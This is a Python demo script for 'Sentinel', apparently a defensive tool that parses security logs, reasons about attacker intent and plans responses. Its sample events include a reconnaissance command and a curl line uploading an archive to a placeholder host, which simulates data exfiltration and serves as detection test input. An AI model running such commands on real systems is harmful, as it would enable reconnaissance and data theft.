"""Local end-to-end demo for the Sentinel scaffold."""

from __future__ import annotations

import argparse
from dataclasses import asdict
from datetime import datetime, timezone
import json
from pathlib import Path
from typing import Any, Iterable

from sentinel.audit import AuditTrail, DecisionRecord, ReportGenerator
from sentinel.defense import PromptInjectionDefense
from sentinel.events import (
    CloudTrailParser,
    LinuxAuditdParser,
    SysmonParser,
    UnifiedSecurityEvent,
    WindowsEventLogParser,
    ZeekParser,
)
from sentinel.llm import OpenAIResponsesProvider, SafetyEnvelopeReasoner
from sentinel.memory import SituationalMemory
from sentinel.reasoning import IntentReasoningEngine
from sentinel.response import LocalResponsePlanner, ResponsePlan
from sentinel.storage import IncidentStore


PARSERS = {
    "sysmon": SysmonParser,
    "windows": WindowsEventLogParser,
    "auditd": LinuxAuditdParser,
    "zeek": ZeekParser,
    "cloudtrail": CloudTrailParser,
}


def demo_events() -> list[dict[str, Any]]:
    return [
        {
            "UtcTime": datetime.now(timezone.utc).isoformat(),
            "EventID": "1",
            "ProcessGuid": "{demo-1}",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell whoami; net user",
            "ParentImage": "C:\\Windows\\explorer.exe",
        },
        {
            "UtcTime": datetime.now(timezone.utc).isoformat(),
            "EventID": "3",
            "ProcessGuid": "{demo-2}",
            "Image": "C:\\Windows\\System32\\curl.exe",
            "CommandLine": "curl.exe -T archive.zip https://example.invalid/upload",
            "DestinationIp": "203.0.113.10",
        },
    ]


def load_raw_events(path: Path, file_format: str = "auto") -> list[dict[str, Any]]:
    if not path.exists():
        raise FileNotFoundError(path)

    text = path.read_text(encoding="utf-8").strip()
    if not text:
        return []

    detected_format = file_format
    if detected_format == "auto":
        detected_format = "jsonl" if path.suffix.lower() in {".jsonl", ".ndjson"} else "json"

    if detected_format == "jsonl":
        return [json.loads(line) for line in text.splitlines() if line.strip()]

    data = json.loads(text)
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        for key in ("events", "Records", "records"):
            value = data.get(key)
            if isinstance(value, list):
                return value
        return [data]
    raise ValueError(f"unsupported JSON root type: {type(data).__name__}")


def infer_parser_name(raw_events: list[dict[str, Any]]) -> str:
    if not raw_events:
        return "sysmon"
    keys = set().union(*(event.keys() for event in raw_events))
    if "eventTime" in keys and "eventName" in keys:
        return "cloudtrail"
    if "id.orig_h" in keys or "id.resp_h" in keys or "uid" in keys:
        return "zeek"
    if "exe" in keys or "comm" in keys or "syscall" in keys:
        return "auditd"
    if "TimeCreated" in keys or "TargetUserName" in keys or "SubjectUserName" in keys:
        return "windows"
    return "sysmon"


def parse_events(raw_events: Iterable[dict[str, Any]], parser_name: str, anomaly_score: float) -> list[UnifiedSecurityEvent]:
    parser = PARSERS[parser_name]()
    events = []
    for raw in raw_events:
        event = parser.parse(raw)
        event.anomaly_score = anomaly_score
        events.append(event)
    return events


def analyze_events(
    events: list[UnifiedSecurityEvent],
    response_dry_run: bool = True,
    allow_execute: bool = False,
    use_llm: bool = False,
) -> tuple[dict[str, Any], DecisionRecord, ResponsePlan, list[str], list[str], bool]:
    memory = SituationalMemory(hours=4)
    for event in events:
        memory.add_event(event)

    context = memory.context_builder.build()
    if use_llm:
        result, llm_metadata = SafetyEnvelopeReasoner(provider=OpenAIResponsesProvider.from_env()).analyze(context)
        flags = list(llm_metadata.get("sanitization_flags", []))
        output_flags = list(llm_metadata.get("validation_flags", []))
        valid = not output_flags
    else:
        defense = PromptInjectionDefense()
        context, flags = defense.sanitize_context(context)
        result = IntentReasoningEngine().analyze(context)
        output_flags = []
        valid = True
    output = result.to_dict()
    if use_llm:
        output["llm_metadata"] = llm_metadata
    else:
        valid, output_flags = PromptInjectionDefense().validate_output(output)

    audit = AuditTrail()
    record = DecisionRecord(
        triggering_events=memory.window.recent(),
        anomaly_scores=[event.anomaly_score for event in memory.window.recent()],
        classified_techniques=[asdict(match) for match in result.matched_techniques],
        narrative=result.narrative_explanation,
        predicted_next=[asdict(prediction) for prediction in result.predicted_next],
        recommended_actions=result.recommended_actions,
        action_taken=result.recommended_actions[0]["action"],
        confidence_score=result.confidence_score,
        llm_reasoning_trace="local deterministic reasoner; no hidden chain of thought captured",
        human_review_required=any(action.get("requires_human") for action in result.recommended_actions),
    )
    audit.append(record)
    response_plan = LocalResponsePlanner().build_plan(
        decision_id=record.decision_id,
        recommended_actions=result.recommended_actions,
        events=memory.window.recent(),
        dry_run=response_dry_run,
        allow_execute=allow_execute,
    )
    return output, record, response_plan, flags, output_flags, valid


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Run the local Sentinel security-analysis prototype.")
    parser.add_argument("--input", type=Path, help="Path to a JSON or JSONL log file. Uses built-in demo events when omitted.")
    parser.add_argument("--format", choices=["auto", "json", "jsonl"], default="auto", help="Input file format.")
    parser.add_argument("--parser", choices=["auto", *PARSERS.keys()], default="auto", help="Log parser to use.")
    parser.add_argument("--anomaly-score", type=float, default=0.72, help="Anomaly score assigned to parsed input events.")
    parser.add_argument("--report", type=Path, help="Optional path for writing the markdown incident report.")
    parser.add_argument("--response-plan", type=Path, help="Optional path for writing the local response plan JSON.")
    parser.add_argument("--incident-db", type=Path, help="Optional SQLite database path for persisting the incident.")
    parser.add_argument("--use-llm", action="store_true", help="Use optional LLM safety-envelope reasoning for uncertain cases.")
    parser.add_argument("--no-response-plan", action="store_true", help="Do not print the local response plan.")
    parser.add_argument("--execute-response", action="store_true", help="Prepare non-dry-run response steps where supported.")
    parser.add_argument("--allow-execute", action="store_true", help="Required with --execute-response to leave dry-run mode.")
    parser.add_argument("--json-only", action="store_true", help="Print only the machine-readable reasoning JSON.")
    return parser


def main() -> None:
    args = build_arg_parser().parse_args()
    raw_events = load_raw_events(args.input, args.format) if args.input else demo_events()
    parser_name = infer_parser_name(raw_events) if args.parser == "auto" else args.parser
    events = parse_events(raw_events, parser_name, args.anomaly_score)
    output, record, response_plan, flags, output_flags, valid = analyze_events(
        events,
        response_dry_run=not args.execute_response,
        allow_execute=args.allow_execute,
        use_llm=args.use_llm,
    )
    report = ReportGenerator().incident_markdown(record)

    print(json.dumps(output, indent=2))
    if flags or output_flags or not valid:
        print(json.dumps({"sanitization_flags": flags, "output_flags": output_flags}, indent=2))
    if not args.json_only:
        print()
        print(report)
        if not args.no_response_plan:
            print()
            print(response_plan.markdown())
    if args.report:
        ReportGenerator().write_incident_report(record, args.report)
        print(f"\nWrote incident report to {args.report}")
    if args.response_plan:
        args.response_plan.write_text(json.dumps(response_plan.to_dict(), indent=2), encoding="utf-8")
        print(f"\nWrote response plan to {args.response_plan}")
    if args.incident_db:
        IncidentStore(args.incident_db).save_decision(record)
        print(f"\nSaved incident to {args.incident_db}")


if __name__ == "__main__":
    main()
